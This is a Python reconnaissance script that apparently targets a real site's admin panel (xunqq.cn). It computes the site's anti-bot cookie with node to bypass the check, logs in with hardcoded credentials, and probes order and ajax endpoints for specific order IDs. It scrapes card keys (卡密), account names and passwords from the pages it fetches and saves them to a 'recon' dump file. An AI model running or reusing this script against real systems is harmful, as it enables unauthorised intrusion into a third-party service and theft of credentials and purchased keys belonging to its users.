#!/usr/bin/env python3
"""Inspect order pages that flagged kami=True."""
import re
import json
import subprocess
import urllib.parse
import urllib.request
import http.cookiejar
from pathlib import Path

HOST = "http://xunqq.cn"
BASE = HOST + "/admin"
UA = "Mozilla/5.0"
OUT = Path("/data/recon/pfqq.net")
USER = "rc5839297"
PWD = "Test123456"
ORDERS = ["20260804182818749", "20260804182819420"]


def main():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def get(url, data=None):
        h = {
            "User-Agent": UA,
            "Referer": BASE + "/",
            "Accept": "*/*",
        }
        if data is not None:
            h["Content-Type"] = "application/x-www-form-urlencoded"
            h["X-Requested-With"] = "XMLHttpRequest"
        req = urllib.request.Request(url, data=data, headers=h)
        try:
            return op.open(req, timeout=20).read().decode("utf-8", "ignore")
        except Exception as e:
            return f"ERR:{e}"

    def setc(n, v):
        cj.set_cookie(
            http.cookiejar.Cookie(
                0, n, v, None, False, "xunqq.cn", False, False, "/", False,
                False, None, False, None, None, {},
            )
        )

    get(HOST + "/nasgo/")
    get(HOST + "/loading/")
    html = get(BASE + "/")
    m = re.search(
        r"setCookie\(\s*[\"']sec_defend[\"']\s*,\s*(.+?)\)\s*;\s*setCookie\(\s*[\"']sec_defend_time[\"']",
        html,
        re.S,
    )
    val = subprocess.run(
        ["node", "-e", f"console.log({m.group(1)})"],
        capture_output=True,
        text=True,
    ).stdout.strip()
    setc("sec_defend", val)
    setc("sec_defend_time", "2")
    get(BASE + "/index.php")
    print(
        "LOGIN",
        get(
            BASE + "/user/ajax.php?act=login",
            data=urllib.parse.urlencode({"user": USER, "pass": PWD}).encode(),
        ),
    )

    out = {}
    for tn in ORDERS:
        for path in [
            f"/?mod=order&orderid={tn}",
            f"/?mod=order&trade_no={tn}",
            f"/?mod=query&data={tn}",
            f"/?mod=pay&trade_no={tn}",
            f"/?mod=faka&orderid={tn}",
            f"/?mod=faka&trade_no={tn}",
        ]:
            body = get(BASE + path)
            if body.startswith("ERR:"):
                print(path, body)
                continue
            fname = f"order_{tn}_{path.replace('?','').replace('&','_').replace('=','_').replace('/','_')}.html"
            (OUT / "probe" / fname).write_text(body, encoding="utf-8")
            # extract contexts around 卡密
            ctx = []
            for m in re.finditer(r".{0,60}卡密.{0,120}", body):
                ctx.append(re.sub(r"\s+", " ", m.group(0))[:200])
            status = re.findall(r"(未支付|已完成|已付款|待支付|支付成功|订单不存在|验证失败)", body)
            # look for credential-like strings
            creds = re.findall(
                r"(?:账号|密码|卡密|kami)[：:\s]*([^\s<]{4,80})", body, re.I
            )
            print(path, "len", len(body), "status", status[:5], "creds", creds[:10])
            for c in ctx[:8]:
                print("  CTX", c)
            out[f"{tn}{path}"] = {
                "len": len(body),
                "status": status[:10],
                "creds": creds[:20],
                "ctx": ctx[:10],
            }

        # ajax order
        for qs in [
            f"act=order&trade_no={tn}",
            f"act=order&orderid={tn}",
            f"act=query&data={tn}",
        ]:
            body = get(BASE + "/ajax.php?" + qs)
            print("AJAX", qs, body[:300])

    # user order list
    for path in ["/user/", "/user/index.php", "/user/?mod=order"]:
        body = get(BASE + path)
        print("USER", path, len(body))
        (OUT / "probe" / ("user_" + path.replace("/", "_").replace("?", "_") + ".html")).write_text(
            body, encoding="utf-8"
        )
        print("  trades", re.findall(r"20\d{15,}", body)[:10])
        print("  kami ctx", [re.sub(r"\s+", " ", m.group(0))[:120] for m in re.finditer(r".{0,40}卡密.{0,80}", body)][:5])

    (OUT / "dump" / "ORDER_KAMI.json").write_text(
        json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print("DONE")


if __name__ == "__main__":
    main()
